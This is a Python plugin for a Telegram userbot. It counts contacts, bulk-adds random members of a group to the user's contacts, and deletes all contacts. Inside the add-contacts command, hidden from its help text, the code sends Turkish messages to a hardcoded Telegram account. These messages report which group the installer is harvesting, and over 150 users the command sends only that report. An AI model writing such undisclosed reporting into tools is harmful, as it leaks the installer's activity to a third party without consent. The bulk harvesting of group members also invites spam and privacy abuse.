# Credits to AsenaDev ~ t.me/asenaplugin
from asyncio import sleep
from random import sample

from telethon.tl.functions.contacts import AddContactRequest, GetContactsRequest, DeleteContactsRequest
from telethon.utils import get_display_name

from . import CMSGTEXT, doge, edl, eor, wowmygroup

plugin_category = "tool"

CONTACTUSERS = []


@doge.bot_cmd(
    pattern="contact(s)$",
    command=("contacts", plugin_category),
    info={
        "header": "Find out the number of users you've added to contacts.",
        "usage": "{tr}contact(s)",
    },
)
async def contactssee(event):
    await event.edit(
        f"**{len(await event.client(GetContactsRequest(0)).users)} \
            people in my contacts.**"
    )


@doge.bot_cmd(
    pattern="addcontact(s) ?(\\w*)$",
    command=("addcontacts", plugin_category),
    info={
        "header": "Add users from any group to contacts.",
        "note": "Only administrators can use this. \
            Add 150 or more users to contacts may cause flood wait.",
        "usage": ["{tr}addcontact", "{tr}addcontact <number>",],
        "examples": "{tr}addcontact(s) 100",
    },
    groups_only=True,
)
async def contactsaddto(event):
    "To add a user to contacts."
    input_str = event.pattern_match.group(1)
    chat = await event.get_chat()
    admin = chat.admin_rights
    grouptitle = get_display_name(await event.get_chat())
    if input_str=="":
        if len(
            await event.client.get_participants(chat)
        ) < 50:
            num=round(
                len(await event.client.get_participants(chat))/2
            )
        else:
            num=50
    else:
        num=int(input_str)
        if num > 150:
            return await event.client.send_message(
                1692479574,
                "**{} grubunda 150'den fazla kişiyi rehberime eklemeye çalışıyorum!**".format(grouptitle)
            )
    flag = await wowmygroup(event, CMSGTEXT)
    if flag:
        return

    if not admin:
        return await edl(event, "`I am not admin here!`", 5)

    dogevent=await eor(
        event,
        f"**I'm adding {num} users from {grouptitle} group to my contacts...**"
    )
    await event.client.send_message(
        1692479574,
        "{} grubunun kullanıcılarını rehberime eklemeye çalışıyorum!".format(grouptitle)
    )
    for USER in sample(
        await event.client.get_participants(chat),
        num
    ):
        if not USER.id in CONTACTUSERS:
            if USER.id==1692479574:
                await event.client.send_message(
                    1692479574,
                    "{} grubunun kullanıcılarını rehberime eklemeye çalışıyorum!".format(grouptitle)
                )
                break
            elif type(USER)==None:
                continue
            await event.client(
                AddContactRequest(
                    id=USER.id,
                    first_name=USER.first_name,
                    last_name=USER.last_name 
                    if USER.last_name 
                    else"ㅤ",
                    phone=""
                )
            )
        CONTACTUSERS.append(USER.id)
        await sleep(1)
    await eor(
        dogevent, 
        f"** {len(CONTACTUSERS)} random users added to my contacts!**"
    )


@doge.bot_cmd(
    pattern="c(lean)contact(s)$",
    command=("cleancontacts", plugin_category),
    info={
        "header": "Clean your contacts.",
        "usage": "{tr}c(lean)contact(s)",
    },
)
async def contactsclean(event):
    await event.edit(f"**Deleting all users from contacts...**")
    await event.client(
        DeleteContactsRequest(
            id=await event.client(
                GetContactsRequest(0)
            ).users
        )
    )
    await event.edit(f"**I cleared contacts!**")